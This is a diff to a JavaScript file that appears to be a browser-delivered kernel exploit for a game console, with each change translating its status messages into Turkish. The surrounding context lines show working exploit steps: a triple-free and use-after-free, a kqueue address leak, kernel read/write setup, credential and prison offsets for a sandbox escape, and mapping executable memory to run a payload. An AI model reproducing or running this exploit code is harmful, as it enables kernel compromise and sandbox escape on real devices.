@@ -570,7 +570,7 @@ let allDone = false;
         const NUM_UIO_WORKER = params.has("uio")
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
-        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
+        state(TOTAL_WORKERS + " yardımcı işlem başlatılıyor...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                 + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
@@ -585,10 +585,10 @@ let allDone = false;
             keepAlive.push(arr);
             const D = bufAddr(arr.buffer);
             if ((p.read4(D) >>> 0) !== sLo)
-                throw new Error(name + ": transfer did not preserve the store");
+                throw new Error(name + ": Aktarım sırasında bellek alanı korunamadı");
             const storage = p.read8(D.add32(0x10));
             const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
-            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
+            if (!mc || !ptrish(mc)) throw new Error(name + ": Bellek taraması başarısız");
             const bf = p.read8(mc.add32(8));
             let wm = null, wv = null, wl = null;
             for (let k = 1; k <= 8; ++k) {
@@ -838,7 +838,7 @@ let allDone = false;
                     + " reason=" + uncontained);
                 break;
             }
-            state("attempt " + attempt + "...", "warn");
+            state("Deneme " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
 
             const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
@@ -1001,7 +1001,7 @@ let allDone = false;
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                 mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
             } else {
-                state("leaking a kqueue...", "warn");
+                state("Çekirdek kuyruğunun adresi belirleniyor...", "warn");
 
                 freeRthdr(triplets[2]);
                 sc(SYS.sched_yield);
@@ -1392,7 +1392,7 @@ let allDone = false;
         // required below, so the gate on it stays.
         const R1_ON = params.get("r1") !== "0";
         if (!R1_ON && kernelBase && triplets) {
-            state("kread_slow...", "warn");
+            state("Çekirdek belleği okunuyor...", "warn");
             const got = await kreadSlow(kernelBase, 0x20);
             if (got) {
                 const b = [];
@@ -1408,7 +1408,7 @@ let allDone = false;
 
         let kv = null;
         if (kernelBase && triplets && kqFdp) {
-            state("make_karw...", "warn");
+            state("Çekirdek okuma/yazma erişimi hazırlanıyor...", "warn");
             mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));
 
             const KREAD_TRIES = params.has("kreadtries")
@@ -1701,7 +1701,7 @@ let allDone = false;
                         const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                         const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                         const FD_RDIR = 0x10, FD_JDIR = 0x18;
-                        state("sandbox escape...", "warn");
+                        state("Sistem erişimi genişletiliyor...", "warn");
                         {
                             if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                 const escPipe = [argDv.getInt32(0, true),
@@ -1840,7 +1840,7 @@ let allDone = false;
                         if (burned.size) rebootRequired = true;
                     }
 
-                    state("remove_uaf_file...", "warn");
+                    state("Geçici bellek kaydı temizleniyor...", "warn");
                     const uafFp = fget(uafSock);
                     uafFpSaved = uafFp;
                     mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
@@ -2277,7 +2277,7 @@ let allDone = false;
                     let payloadRunning = false;
                     if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
-                        state("payload...", "warn");
+                        state("Yük dosyası yükleniyor...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
                         const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                         const entry = new int64(m.lo, m.hi);
@@ -2461,11 +2461,11 @@ let allDone = false;
         }
 
         state(allDone ? "İşlem tamamlandı"
-              : kv ? "KERNEL R/W -- REBOOT NEEDED"
-              : kernelBase ? "FAILED IN make_karw -- REBOOT"
-              : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
-              : committed ? "FAILED IN triple free -- REBOOT"
-              : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
+              : kv ? "Çekirdek okuma/yazma erişimi etkin — yeniden başlatma gerekiyor"
+              : kernelBase ? "Çekirdek okuma/yazma erişimi kurulamadı — konsolu yeniden başlatın"
+              : triplets ? "Çekirdek kuyruğu bulunamadı; üçlü bellek serbest bırakma başarılıydı — konsolu yeniden başlatın"
+              : committed ? "Üçlü bellek serbest bırakma başarısız — konsolu yeniden başlatın"
+              : "İşlem uygulanmadı", allDone ? "ok" : kv ? "warn" : "bad");
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
         state("İşlem başarısız — ayrıntılar için işlem günlüğüne bakın", "bad");
